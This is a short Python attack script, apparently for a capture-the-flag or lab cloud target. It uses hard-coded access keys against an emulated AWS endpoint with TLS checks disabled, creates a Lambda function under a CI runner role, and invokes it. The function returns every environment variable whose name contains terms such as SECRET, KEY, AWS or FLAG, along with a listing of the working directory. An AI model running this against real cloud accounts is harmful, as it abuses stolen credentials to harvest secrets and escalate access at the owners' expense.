import boto3
import json
import zipfile
import io
import urllib3
urllib3.disable_warnings()

ENDPOINT = "https://web-d94df0e990e63e98.web.h7tex.com"
KEY_ID = "AKIAANALYST0000000000"
SECRET = "wJalrAnalystSecretKeyEXAMPLEbPxRfiCY"
REGION = "us-east-1"

session = boto3.Session(
    aws_access_key_id=KEY_ID,
    aws_secret_access_key=SECRET,
    region_name=REGION
)

lam = session.client("lambda", endpoint_url=ENDPOINT, verify=False)

# Create zip with lambda_function.py
code_str = """
import os
import json

def lambda_handler(event, context):
    return {
        "status": "ok",
        "env": {k: v for k, v in os.environ.items() if "AWS" in k or "FLAG" in k or "URL" in k or "ENDPOINT" in k or "SECRET" in k or "KEY" in k},
        "cwd": os.getcwd(),
        "files": os.listdir('.')
    }
"""

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("lambda_function.py", code_str)
zip_bytes = buf.getvalue()

print("[*] Creating test lambda function...")
try:
    res = lam.create_function(
        FunctionName="test_runner",
        Runtime="python3.12",
        Role="arn:aws:iam::111111111111:role/ci-runner-role",
        Handler="lambda_function.lambda_handler",
        Code={"ZipFile": zip_bytes}
    )
    print("[+] CreateFunction response:", json.dumps(res, indent=2, default=str))
except Exception as e:
    print("[-] CreateFunction error:", e)

print("\n[*] Invoking test lambda function...")
try:
    inv = lam.invoke(
        FunctionName="test_runner",
        Payload=b'{}'
    )
    payload = inv["Payload"].read().decode()
    print("[+] Invoke response payload:", payload)
except Exception as e:
    print("[-] Invoke error:", e)
